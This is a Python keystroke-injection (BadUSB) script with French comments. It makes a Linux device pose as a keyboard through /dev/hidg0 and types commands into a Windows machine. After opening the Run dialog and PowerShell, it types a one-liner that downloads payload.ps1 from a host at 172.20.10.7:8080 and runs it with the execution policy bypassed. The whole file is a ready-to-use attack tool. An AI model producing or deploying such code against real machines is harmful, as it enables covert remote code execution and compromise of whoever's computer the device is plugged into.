#!/usr/bin/env python3
import time

HID = "/dev/hidg0"

def write_report(report):
    with open(HID, 'wb') as fd:
        fd.write(report)

def press_key(keycode, modifier=0x00):
    write_report(bytes([modifier, 0, keycode, 0, 0, 0, 0, 0]))
    time.sleep(0.02)
    write_report(b'\x00\x00\x00\x00\x00\x00\x00\x00')
    time.sleep(0.02)

# Mapping clavier US -> pour cible AZERTY on utilisera Alt+Numpad
NUMPAD = {
    '0': 0x62, '1': 0x59, '2': 0x5A, '3': 0x5B, '4': 0x5C,
    '5': 0x5D, '6': 0x5E, '7': 0x5F, '8': 0x60, '9': 0x61
}

def type_char_alt(char):
    code = ord(char)
    digits = str(code)
    write_report(bytes([0x04, 0, 0, 0, 0, 0, 0, 0]))
    time.sleep(0.05)
    for d in digits:
        write_report(bytes([0x04, 0, NUMPAD[d], 0, 0, 0, 0, 0]))
        time.sleep(0.05)
        write_report(bytes([0x04, 0, 0, 0, 0, 0, 0, 0]))
        time.sleep(0.05)
    write_report(b'\x00\x00\x00\x00\x00\x00\x00\x00')
    time.sleep(0.05)

def type_string(text):
    for char in text:
        type_char_alt(char)

# === Injection ===
print("[*] HID Injection starting...")
time.sleep(5)

# Win + R
write_report(b'\x08\x00\x00\x15\x00\x00\x00\x00')
time.sleep(0.4)
write_report(b'\x00\x00\x00\x00\x00\x00\x00\x00')
time.sleep(0.5)

# Ouvrir PowerShell
type_string("powershell")
time.sleep(0.3)
press_key(0x28)
time.sleep(2)

# Commande complete
cmd = "(New-Object Net.WebClient).DownloadFile('http://172.20.10.7:8080/payload.ps1','C:\\Users\\Public\\p.ps1');C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ep bypass -File C:\\Users\\Public\\p.ps1"

type_string(cmd)
time.sleep(0.5)
press_key(0x28)

print("[+] Commande injectee")
